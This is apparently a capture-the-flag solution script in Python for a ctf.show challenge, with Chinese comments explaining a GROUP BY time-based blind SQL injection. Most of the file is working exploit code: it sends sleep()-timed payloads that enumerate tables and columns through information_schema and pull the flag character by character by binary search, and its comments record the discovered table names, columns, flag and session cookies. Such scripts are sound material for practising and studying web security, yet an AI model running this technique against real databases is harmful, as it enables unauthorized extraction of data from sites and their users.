import time
import threading
import requests

'''
查询语句

       //分页查询
  $sql = select * from ctfshow_user group by $username;
返回逻辑

 //TODO:很安全，不需要过滤
      
'''

'''
group by 注入
select * from users group by 1,if(1=1,sleep(0.05),1)
需要注意的是，是对查询结果的每一行都进行一次sleep
当前题目ID一共有21条
'''

url = "http://7fdef560-4000-4039-a44e-1a12811c72ba.challenge.ctf.show:8080/api/?u="
"""
Author:feng
"""

flag = ''
for i in range(1, 100):
    min = 32
    max = 128
    while 1:
        j = min + (max - min) // 2
        if min == j:
            flag += chr(j)
            print(flag)
            if chr(j) == '}':
                exit()
            break


        # payload="1,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{},sleep(0.02),1)".format(i,j)

        # ctfshow_flaga, ctfshow_user
        payload="1,if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'),{},1))<{},sleep(0.02),1)".format(i,j)

        # id,flagaabc,info
        payload = "1,if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),{},1))<{},sleep(0.02),1)".format(i, j)

        # ctfshow{fa5a8ae7-e076-44d0-9b48-41f4624efd21}
        print(payload)

        headers = {
            'Cookie': 'UM_distinctid=17890103924aa1-0cda5be2c15a06-5771031-15f900-17890103925956; __cfduid=ddab917a77cec6a0b08609bf8d8d5ba191619661543; td_cookie=3510418278; PHPSESSID=vjc83bk0crf8su8k9qdtq88cmh',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
            'Referer': 'http://a0c5e9c8-6094-4766-8239-1106e1c73c6e.challenge.ctf.show:8080/api/index.php'
        }

        try:
            r = requests.get(url=url + payload, timeout=0.4)
            min = j
        except Exception as e:
            max = j
        time.sleep(0.2)
    time.sleep(1)

